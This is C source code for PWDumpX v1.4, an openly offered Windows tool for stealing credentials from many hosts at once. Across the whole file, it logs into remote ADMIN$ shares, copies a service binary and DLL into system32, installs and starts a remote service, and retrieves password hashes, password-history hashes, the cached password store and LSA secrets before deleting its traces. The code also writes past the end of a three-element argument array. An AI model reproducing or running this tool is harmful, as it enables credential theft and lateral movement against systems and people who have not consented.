//
// gcc PWDumpX.c -o PWDumpX.exe -lmpr -ladvapi32
//

#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <process.h>
#include <winnetwk.h>

#define MAX_THREADS 64

VOID             Usage( VOID );
VOID       ThreadedSub( VOID *pParameter );
BOOL           Connect( CHAR *szTarget, CHAR *szUsername, CHAR *szPassword, BOOL *bMultipleHosts );
VOID        RunPWDumpX( CHAR *szTarget, BOOL *bDumpPWCache, BOOL *bDumpLSASecrets, BOOL *bDumpPWHashes, BOOL *bDumpPWHistoryHashes, BOOL *bMultipleHosts );
VOID DecryptOutputFile( CHAR *szFile );
CHAR        *Obfuscate( CHAR *szData );
VOID        Disconnect( CHAR *szTarget, BOOL *bMultipleHosts );

typedef struct _THREAD_ARGS
{
	CHAR              Target[ 128 ];
	CHAR            Username[ 128 ];
	CHAR            Password[ 128 ];
	BOOL         DumpPWCache;
	BOOL      DumpLSASecrets;
	BOOL        DumpPWHashes;
	BOOL DumpPWHistoryHashes;
	BOOL       MultipleHosts;
} THREAD_ARGS, *PTHREAD_ARGS;

HANDLE hSemaphore;

INT nThreads = 0;

INT main( INT argc, CHAR *argv[] )
{
	BOOL             bContinue;
	CHAR         szTargetInput[ 128 ];
	CHAR            szUsername[ 128 ];
	CHAR            szPassword[ 128 ];
	BOOL          bDumpPWCache;
	BOOL       bDumpLSASecrets;
	BOOL         bDumpPWHashes;
	BOOL  bDumpPWHistoryHashes;
	CHAR           szArguments[ 128 ];
	DWORD                    i;
	FILE           *pInputFile;
	CHAR            szReadLine[ 128 ];
	CHAR              szTarget[ 128 ];
	CHAR        szFullUsername[ 128 ];

	PTHREAD_ARGS pThreadArgs;

	hSemaphore = CreateSemaphore( NULL, 1, 1, NULL );

	if ( argc > 3 && argc < 6 )
	{
		bContinue = TRUE;

		if ( argc == 4 )
		{
			strcpy( szTargetInput, argv[1] );
			strcpy( szUsername,    argv[2] );
			strcpy( szPassword,    argv[3] );

			printf( "Running PWDumpX v1.4 with the following arguments:\n" );
			printf( "[+] Host Input:   \"%s\"\n", szTargetInput );
			printf( "[+] Username:     \"%s\"\n", szUsername );
			printf( "[+] Password:     \"%s\"\n", szPassword );
			printf( "[+] # of Threads: \"64\"\n" );
			printf( "\n" );

			bDumpPWCache         = FALSE;
			bDumpLSASecrets      = FALSE;
			bDumpPWHashes        = TRUE;
			bDumpPWHistoryHashes = FALSE;
		}

		if ( argc == 5 )
		{
			strcpy( szArguments,   argv[1] );
			strcpy( szTargetInput, argv[2] );
			strcpy( szUsername,    argv[3] );
			strcpy( szPassword,    argv[4] );

			strlwr( szArguments );

			printf( "Running PWDumpX v1.4 with the following arguments:\n" );
			printf( "[+] Host Input:   \"%s\"\n", szTargetInput );
			printf( "[+] Username:     \"%s\"\n", szUsername );
			printf( "[+] Password:     \"%s\"\n", szPassword );
			printf( "[+] Arguments:    \"%s\"\n", szArguments );
			printf( "[+] # of Threads: \"64\"\n" );
			printf( "\n" );

			bDumpPWCache         = FALSE;
			bDumpLSASecrets      = FALSE;
			bDumpPWHashes        = FALSE;
			bDumpPWHistoryHashes = FALSE;

			for ( i = 0; i < strlen( szArguments ); i++ )
			{
				if ( szArguments[i] == 'c' )
				{
					bDumpPWCache = TRUE;
				}

				if ( szArguments[i] == 'l' )
				{
					bDumpLSASecrets = TRUE;
				}

				if ( szArguments[i] == 'p' )
				{
					bDumpPWHashes = TRUE;
				}

				if ( szArguments[i] == 'h' )
				{
					bDumpPWHistoryHashes = TRUE;
				}

				if ( szArguments[i] != '-' && szArguments[i] != 'c' && szArguments[i] != 'l' && szArguments[i] != 'p' && szArguments[i] != 'h' )
				{
					bContinue = FALSE;
				}
			}
		}

		if ( bContinue )
		{
			pInputFile = fopen( szTargetInput, "r" );

			if ( pInputFile != NULL )
			{
				while ( fscanf( pInputFile, "%s", szReadLine ) != EOF )
				{
					if ( strstr( szUsername, "\\" ) == NULL && strcmp( szUsername, "+" ) != 0 && strcmp( szUsername, "" ) != 0 )
					{
						strcpy( szTarget, szReadLine );

						sprintf( szFullUsername, "%s\\%s", szTarget, szUsername );

						while ( nThreads >= MAX_THREADS )
						{
							Sleep( 200 );
						}

						pThreadArgs = (PTHREAD_ARGS)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( THREAD_ARGS ) );

						if ( pThreadArgs != NULL )
						{
							strcpy( pThreadArgs->Target,   szTarget );
							strcpy( pThreadArgs->Username, szFullUsername );
							strcpy( pThreadArgs->Password, szPassword );

							pThreadArgs->DumpPWCache         = bDumpPWCache;
							pThreadArgs->DumpLSASecrets      = bDumpLSASecrets;
							pThreadArgs->DumpPWHashes        = bDumpPWHashes;
							pThreadArgs->DumpPWHistoryHashes = bDumpPWHistoryHashes;
							pThreadArgs->MultipleHosts       = TRUE;

							WaitForSingleObject( hSemaphore, INFINITE );

							nThreads++;

							ReleaseSemaphore( hSemaphore, 1, NULL );

							_beginthread( ThreadedSub, 0, (VOID *)pThreadArgs );
						}
					}
					else
					{
						strcpy( szTarget, szReadLine );

						while ( nThreads >= MAX_THREADS )
						{
							Sleep( 200 );
						}

						pThreadArgs = (PTHREAD_ARGS)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( THREAD_ARGS ) );

						if ( pThreadArgs != NULL )
						{
							strcpy( pThreadArgs->Target,   szTarget );
							strcpy( pThreadArgs->Username, szUsername );
							strcpy( pThreadArgs->Password, szPassword );

							pThreadArgs->DumpPWCache         = bDumpPWCache;
							pThreadArgs->DumpLSASecrets      = bDumpLSASecrets;
							pThreadArgs->DumpPWHashes        = bDumpPWHashes;
							pThreadArgs->DumpPWHistoryHashes = bDumpPWHistoryHashes;
							pThreadArgs->MultipleHosts       = TRUE;

							WaitForSingleObject( hSemaphore, INFINITE );

							nThreads++;

							ReleaseSemaphore( hSemaphore, 1, NULL );

							_beginthread( ThreadedSub, 0, (VOID *)pThreadArgs );
						}
					}
				}

				fclose( pInputFile );

				Sleep( 1000 );

				printf( "Waiting for threads to terminate...\n" );
			}
			else
			{
				if ( strstr( szUsername, "\\" ) == NULL && strcmp( szUsername, "+" ) != 0 && strcmp( szUsername, "" ) != 0 )
				{
					strcpy( szTarget, szTargetInput );

					sprintf( szFullUsername, "%s\\%s", szTarget, szUsername );

					pThreadArgs = (PTHREAD_ARGS)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( THREAD_ARGS ) );

					if ( pThreadArgs != NULL )
					{
						strcpy( pThreadArgs->Target,   szTarget );
						strcpy( pThreadArgs->Username, szFullUsername );
						strcpy( pThreadArgs->Password, szPassword );

						pThreadArgs->DumpPWCache         = bDumpPWCache;
						pThreadArgs->DumpLSASecrets      = bDumpLSASecrets;
						pThreadArgs->DumpPWHashes        = bDumpPWHashes;
						pThreadArgs->DumpPWHistoryHashes = bDumpPWHistoryHashes;
						pThreadArgs->MultipleHosts       = FALSE;

						WaitForSingleObject( hSemaphore, INFINITE );

						nThreads++;

						ReleaseSemaphore( hSemaphore, 1, NULL );

						_beginthread( ThreadedSub, 0, (VOID *)pThreadArgs );
					}
				}
				else
				{
					strcpy( szTarget, szTargetInput );

					pThreadArgs = (PTHREAD_ARGS)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( THREAD_ARGS ) );

					if ( pThreadArgs != NULL )
					{
						strcpy( pThreadArgs->Target,   szTarget );
						strcpy( pThreadArgs->Username, szUsername );
						strcpy( pThreadArgs->Password, szPassword );

						pThreadArgs->DumpPWCache         = bDumpPWCache;
						pThreadArgs->DumpLSASecrets      = bDumpLSASecrets;
						pThreadArgs->DumpPWHashes        = bDumpPWHashes;
						pThreadArgs->DumpPWHistoryHashes = bDumpPWHistoryHashes;
						pThreadArgs->MultipleHosts       = FALSE;

						WaitForSingleObject( hSemaphore, INFINITE );

						nThreads++;

						ReleaseSemaphore( hSemaphore, 1, NULL );

						_beginthread( ThreadedSub, 0, (VOID *)pThreadArgs );
					}
				}
			}

			while ( nThreads > 0 )
			{
				Sleep( 200 );
			}
		}
		else
		{
			Usage();
		}
	}
	else
	{
		Usage();
	}

	CloseHandle( hSemaphore );

	return 0;
}

VOID Usage( VOID )
{
	printf( "PWDumpX v1.4 | http://reedarvin.thearvins.com/\n" );
	printf( "\n" );
	printf( "Usage: PWDumpX [-clph] <hostname | ip input file> <username> <password>\n" );
	printf( "\n" );
	printf( "[-clph]                     -- optional argument\n" );
	printf( "<hostname | ip input file>  -- required argument\n" );
	printf( "<username>                  -- required argument\n" );
	printf( "<password>                  -- required argument\n" );
	printf( "\n" );
	printf( "-c  -- Dump Password Cache\n" );
	printf( "-l  -- Dump LSA Secrets\n" );
	printf( "-p  -- Dump Password Hashes\n" );
	printf( "-h  -- Dump Password History Hashes\n" );
	printf( "\n" );
	printf( "If the <username> and <password> arguments are both plus signs (+), the\n" );
	printf( "existing credentials of the user running this utility will be used.\n" );
	printf( "\n" );
	printf( "Examples:\n" );
	printf( "PWDumpX 10.10.10.10 + +\n" );
	printf( "PWDumpX 10.10.10.10 administrator password\n" );
	printf( "\n" );
	printf( "PWDumpX -lp MyWindowsMachine + +\n" );
	printf( "PWDumpX -lp MyWindowsMachine administrator password\n" );
	printf( "\n" );
	printf( "PWDumpX -clph IPInputFile.txt + +\n" );
	printf( "PWDumpX -clph IPInputFile.txt administrator password\n" );
	printf( "\n" );
	printf( "(Written by Reed Arvin | reedarvin@gmail.com)\n" );
}

VOID ThreadedSub( VOID *pParameter )
{
	CHAR             szTarget[ 128 ];
	CHAR           szUsername[ 128 ];
	CHAR           szPassword[ 128 ];
	BOOL         bDumpPWCache;
	BOOL      bDumpLSASecrets;
	BOOL        bDumpPWHashes;
	BOOL bDumpPWHistoryHashes;
	BOOL       bMultipleHosts;

	PTHREAD_ARGS pThreadArgs;

	pThreadArgs = (PTHREAD_ARGS)pParameter;

	strcpy( szTarget,   pThreadArgs->Target );
	strcpy( szUsername, pThreadArgs->Username );
	strcpy( szPassword, pThreadArgs->Password );

	bDumpPWCache         = pThreadArgs->DumpPWCache;
	bDumpLSASecrets      = pThreadArgs->DumpLSASecrets;
	bDumpPWHashes        = pThreadArgs->DumpPWHashes;
	bDumpPWHistoryHashes = pThreadArgs->DumpPWHistoryHashes;
	bMultipleHosts       = pThreadArgs->MultipleHosts;

	HeapFree( GetProcessHeap(), 0, pThreadArgs );

	if ( bMultipleHosts == TRUE )
	{
		printf( "Spawning thread for host %s...\n", szTarget );
	}

	if ( strcmp( szUsername, "+" ) == 0 && strcmp( szPassword, "+" ) == 0 )
	{
		RunPWDumpX( szTarget, &bDumpPWCache, &bDumpLSASecrets, &bDumpPWHashes, &bDumpPWHistoryHashes, &bMultipleHosts );
	}
	else
	{
		if ( Connect( szTarget, szUsername, szPassword, &bMultipleHosts ) )
		{
			RunPWDumpX( szTarget, &bDumpPWCache, &bDumpLSASecrets, &bDumpPWHashes, &bDumpPWHistoryHashes, &bMultipleHosts );

			Disconnect( szTarget, &bMultipleHosts );
		}
	}

	WaitForSingleObject( hSemaphore, INFINITE );

	nThreads--;

	ReleaseSemaphore( hSemaphore, 1, NULL );

	_endthread();
}

BOOL Connect( CHAR szTarget[], CHAR szUsername[], CHAR szPassword[], BOOL *bMultipleHosts )
{
	CHAR        szRemoteName[ 128 ];
	NETRESOURCE           nr;
	DWORD           dwResult;

	sprintf( szRemoteName, "\\\\%s\\ADMIN$", szTarget );

	nr.dwType       = RESOURCETYPE_ANY;
	nr.lpLocalName  = NULL;
	nr.lpRemoteName = szRemoteName;
	nr.lpProvider   = NULL;

	dwResult = WNetAddConnection2( &nr, szPassword, szUsername, 0 );

	if ( dwResult == NO_ERROR )
	{
		return TRUE;
	}
	else
	{
		if ( *bMultipleHosts == FALSE )
		{
			fprintf( stderr, "ERROR! Cannot connect to \\\\%s\\ADMIN$.\n", szTarget );
		}

		return FALSE;
	}
}

VOID RunPWDumpX( CHAR szTarget[], BOOL *bDumpPWCache, BOOL *bDumpLSASecrets, BOOL *bDumpPWHashes, BOOL *bDumpPWHistoryHashes, BOOL *bMultipleHosts )
{
	CHAR                   szRemotePWDumpEXEPath[ 256 ];
	CHAR                   szRemotePWDumpDLLPath[ 256 ];
	SC_HANDLE                       schSCManager;
	SC_HANDLE                         schService;
	CHAR                           szDumpPWCache[ 128 ];
	CHAR                        szDumpLSASecrets[ 128 ];
	CHAR                          szDumpPWHashes[ 128 ];
	CHAR                   szDumpPWHistoryHashes[ 128 ];
	CHAR                             *pArguments[ 3 ];
	SERVICE_STATUS_PROCESS              ssStatus;
	DWORD                          dwBytesNeeded;
	CHAR                           szSrcFileName[ 128 ];
	CHAR                           szDstFileName[ 128 ];

	sprintf( szRemotePWDumpEXEPath, "\\\\%s\\ADMIN$\\system32\\DumpSvc.exe", szTarget );

	if ( CopyFile( "DumpSvc.exe", szRemotePWDumpEXEPath, FALSE ) )
	{
		sprintf( szRemotePWDumpDLLPath, "\\\\%s\\ADMIN$\\system32\\DumpExt.dll", szTarget );

		if ( CopyFile( "DumpExt.dll", szRemotePWDumpDLLPath, FALSE ) )
		{
			schSCManager = OpenSCManager( szTarget, NULL, SC_MANAGER_ALL_ACCESS );
 
			if ( schSCManager != NULL )
			{
				schService = CreateService( schSCManager, "PWDumpX", "PWDumpX Service", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, "%windir%\\system32\\DumpSvc.exe", NULL, NULL, NULL, NULL, NULL );

				if ( schService != NULL )
				{
					strcpy( szDumpPWCache,         "FALSE" );
					strcpy( szDumpLSASecrets,      "FALSE" );
					strcpy( szDumpPWHashes,        "FALSE" );
					strcpy( szDumpPWHistoryHashes, "FALSE" );

					if ( *bDumpPWCache )
					{
						strcpy( szDumpPWCache, "TRUE" );
					}

					if ( *bDumpLSASecrets )
					{
						strcpy( szDumpLSASecrets, "TRUE" );
					}

					if ( *bDumpPWHashes )
					{
						strcpy( szDumpPWHashes, "TRUE" );
					}

					if ( *bDumpPWHistoryHashes )
					{
						strcpy( szDumpPWHistoryHashes, "TRUE" );
					}

					pArguments[0] = szDumpPWCache;
					pArguments[1] = szDumpLSASecrets;
					pArguments[2] = szDumpPWHashes;
					pArguments[3] = szDumpPWHistoryHashes;

					if ( StartService( schService, 4, (LPCSTR *)pArguments ) )
					{
						if ( *bMultipleHosts == FALSE )
						{
							printf( "Waiting for PWDumpX service to terminate on host %s", szTarget );
						}

						while ( TRUE )
						{
							if ( QueryServiceStatusEx( schService, SC_STATUS_PROCESS_INFO, (BYTE *)&ssStatus, sizeof( SERVICE_STATUS_PROCESS ), &dwBytesNeeded ) )
							{
								if ( ssStatus.dwCurrentState == SERVICE_STOPPED )
								{
									break;
								}
								else
								{
									if ( *bMultipleHosts == FALSE )
									{
										printf( "." );
									}
								}
							}
							else
							{
								if ( *bMultipleHosts == FALSE )
								{
									fprintf( stderr, "ERROR! Cannot query PWDumpX service status on host %s.\n", szTarget );
								}

								break;
							}

							Sleep( 1000 );
						}

						if ( *bMultipleHosts == FALSE )
						{
							printf( "\n" );
							printf( "\n" );
						}

						if ( *bDumpPWCache )
						{
							sprintf( szSrcFileName, "\\\\%s\\ADMIN$\\system32\\PWCache.txt", szTarget );
							sprintf( szDstFileName, "%s-PWCache.txt", szTarget );

							if ( CopyFile( szSrcFileName, szDstFileName, FALSE ) )
							{
								if ( *bMultipleHosts == FALSE )
								{
									printf( "Retrieved file %s-PWCache.txt\n", szTarget );
								}

								if ( !DeleteFile( szSrcFileName ) )
								{
									if ( *bMultipleHosts == FALSE )
									{
										fprintf( stderr, "ERROR! Cannot delete file \\\\%s\\ADMIN$\\system32\\PWCache.txt.\n", szTarget );
									}
								}

								DecryptOutputFile( szDstFileName );
							}
							else
							{
								if ( *bMultipleHosts == FALSE )
								{
									fprintf( stderr, "ERROR! Cannot copy file \\\\%s\\ADMIN$\\system32\\PWCache.txt.\n", szTarget );
								}
							}
						}

						if ( *bDumpLSASecrets )
						{
							sprintf( szSrcFileName, "\\\\%s\\ADMIN$\\system32\\LSASecrets.txt", szTarget );
							sprintf( szDstFileName, "%s-LSASecrets.txt", szTarget );

							if ( CopyFile( szSrcFileName, szDstFileName, FALSE ) )
							{
								if ( *bMultipleHosts == FALSE )
								{
									printf( "Retrieved file %s-LSASecrets.txt\n", szTarget );
								}

								if ( !DeleteFile( szSrcFileName ) )
								{
									if ( *bMultipleHosts == FALSE )
									{
										fprintf( stderr, "ERROR! Cannot delete file \\\\%s\\ADMIN$\\system32\\LSASecrets.txt.\n", szTarget );
									}
								}

								DecryptOutputFile( szDstFileName );
							}
							else
							{
								if ( *bMultipleHosts == FALSE )
								{
									fprintf( stderr, "ERROR! Cannot copy file \\\\%s\\ADMIN$\\system32\\LSASecrets.txt.\n", szTarget );
								}
							}
						}

						if ( *bDumpPWHashes )
						{
							sprintf( szSrcFileName, "\\\\%s\\ADMIN$\\system32\\PWHashes.txt", szTarget );
							sprintf( szDstFileName, "%s-PWHashes.txt", szTarget );

							if ( CopyFile( szSrcFileName, szDstFileName, FALSE ) )
							{
								if ( *bMultipleHosts == FALSE )
								{
									printf( "Retrieved file %s-PWHashes.txt\n", szTarget );
								}

								if ( !DeleteFile( szSrcFileName ) )
								{
									if ( *bMultipleHosts == FALSE )
									{
										fprintf( stderr, "ERROR! Cannot delete file \\\\%s\\ADMIN$\\system32\\PWHashes.txt.\n", szTarget );
									}
								}

								DecryptOutputFile( szDstFileName );
							}
							else
							{
								if ( *bMultipleHosts == FALSE )
								{
									fprintf( stderr, "ERROR! Cannot copy file \\\\%s\\ADMIN$\\system32\\PWHashes.txt.\n", szTarget );
								}
							}
						}

						if ( *bDumpPWHistoryHashes )
						{
							sprintf( szSrcFileName, "\\\\%s\\ADMIN$\\system32\\PWHistoryHashes.txt", szTarget );
							sprintf( szDstFileName, "%s-PWHistoryHashes.txt", szTarget );

							if ( CopyFile( szSrcFileName, szDstFileName, FALSE ) )
							{
								if ( *bMultipleHosts == FALSE )
								{
									printf( "Retrieved file %s-PWHistoryHashes.txt\n", szTarget );
								}

								if ( !DeleteFile( szSrcFileName ) )
								{
									if ( *bMultipleHosts == FALSE )
									{
										fprintf( stderr, "ERROR! Cannot delete file \\\\%s\\ADMIN$\\system32\\PWHistoryHashes.txt.\n", szTarget );
									}
								}

								DecryptOutputFile( szDstFileName );
							}
							else
							{
								if ( *bMultipleHosts == FALSE )
								{
									fprintf( stderr, "ERROR! Cannot copy file \\\\%s\\ADMIN$\\system32\\PWHistoryHashes.txt.\n", szTarget );
								}
							}
						}

						sprintf( szSrcFileName, "\\\\%s\\ADMIN$\\system32\\ErrorLog.txt", szTarget );
						sprintf( szDstFileName, "%s-ErrorLog.txt", szTarget );

						if ( CopyFile( szSrcFileName, szDstFileName, FALSE ) )
						{
							if ( *bMultipleHosts == FALSE )
							{
								printf( "Retrieved file %s-ErrorLog.txt\n", szTarget );
							}

							if ( !DeleteFile( szSrcFileName ) )
							{
								if ( *bMultipleHosts == FALSE )
								{
									fprintf( stderr, "ERROR! Cannot delete file \\\\%s\\ADMIN$\\system32\\ErrorLog.txt.\n", szTarget );
								}
							}
						}
					}
					else
					{
						if ( *bMultipleHosts == FALSE )
						{
							fprintf( stderr, "ERROR! Cannot start PWDumpX service on host %s.\n", szTarget );
						}
					}

					if ( !DeleteService( schService ) != 0 )
					{
						if ( *bMultipleHosts == FALSE )
						{
							fprintf( stderr, "ERROR! Cannot remove PWDumpX service from host %s.\n", szTarget );
						}
					}

					CloseServiceHandle( schService );
				}
				else
				{
					if ( *bMultipleHosts == FALSE )
					{
						fprintf( stderr, "ERROR! Cannot create PWDumpX service on host %s.\n", szTarget );
					}
				}

				CloseServiceHandle( schSCManager );
			}
			else
			{
				if ( *bMultipleHosts == FALSE )
				{
					fprintf( stderr, "ERROR! Cannot open service manager on host %s.\n", szTarget );
				}
			}

			if ( !DeleteFile( szRemotePWDumpDLLPath ) )
			{
				if ( *bMultipleHosts == FALSE )
				{
					fprintf( stderr, "ERROR! Cannot delete file \\\\%s\\ADMIN$\\system32\\DumpExt.dll.\n", szTarget );
				}
			}
		}
		else
		{
			if ( *bMultipleHosts == FALSE )
			{
				fprintf( stderr, "ERROR! Cannot copy file DumpExt.dll to \\\\%s\\ADMIN$\\system32\\.\n", szTarget );
			}
		}

		if ( !DeleteFile( szRemotePWDumpEXEPath ) )
		{
			if ( *bMultipleHosts == FALSE )
			{
				fprintf( stderr, "ERROR! Cannot delete file \\\\%s\\ADMIN$\\system32\\DumpSvc.exe.\n", szTarget );
			}
		}
	}
	else
	{
		if ( *bMultipleHosts == FALSE )
		{
			fprintf( stderr, "ERROR! Cannot copy file DumpSvc.exe to \\\\%s\\ADMIN$\\system32\\.\n", szTarget );
		}
	}
}

VOID DecryptOutputFile( CHAR szFile[] )
{
	CHAR szOutputFile[ 256 ];
	FILE  *pInputFile;
	CHAR       szLine[ 1024 ];
	FILE *pOutputFile;

	sprintf( szOutputFile, "%s.Obfuscated", szFile );

	pInputFile = fopen( szFile, "r" );

	if ( pInputFile != NULL )
	{
		while ( fgets( szLine, sizeof( szLine ), pInputFile ) != NULL )
		{
			pOutputFile = fopen( szOutputFile, "r" );

			if ( pOutputFile != NULL )
			{
				fclose( pOutputFile );
			}
			else
			{
				pOutputFile = fopen( szOutputFile, "w" );

				if ( pOutputFile != NULL )
				{
					fclose( pOutputFile );
				}
			}

			pOutputFile = fopen( szOutputFile, "a+" );

			if ( pOutputFile != NULL )
			{
				fprintf( pOutputFile, "%s", Obfuscate( szLine ) );

				fclose( pOutputFile );
			}
		}

		fclose( pInputFile );
	}

	if ( CopyFile( szOutputFile, szFile, FALSE ) )
	{
		DeleteFile( szOutputFile );
	}
}

CHAR *Obfuscate( CHAR szData[] )
{
	DWORD dwSize;
	DWORD      i;

	dwSize = strlen( szData );

	i = 0;

	while ( i < dwSize )
	{
		szData[i] = szData[i] ^ 1;

		i++;
	}

	szData[i] = '\0';

	return szData;
}

VOID Disconnect( CHAR szTarget[], BOOL *bMultipleHosts )
{
	CHAR  szRemoteName[ 128 ];
	DWORD     dwResult;

	sprintf( szRemoteName, "\\\\%s\\ADMIN$", szTarget );

	dwResult = WNetCancelConnection2( szRemoteName, 0, TRUE );

	if ( dwResult != NO_ERROR )
	{
		if ( *bMultipleHosts == FALSE )
		{
			fprintf( stderr, "ERROR! Cannot disconnect from \\\\%s\\ADMIN$.\n", szTarget );
		}
	}
}

// Written by Reed Arvin | reedarvin@gmail.com
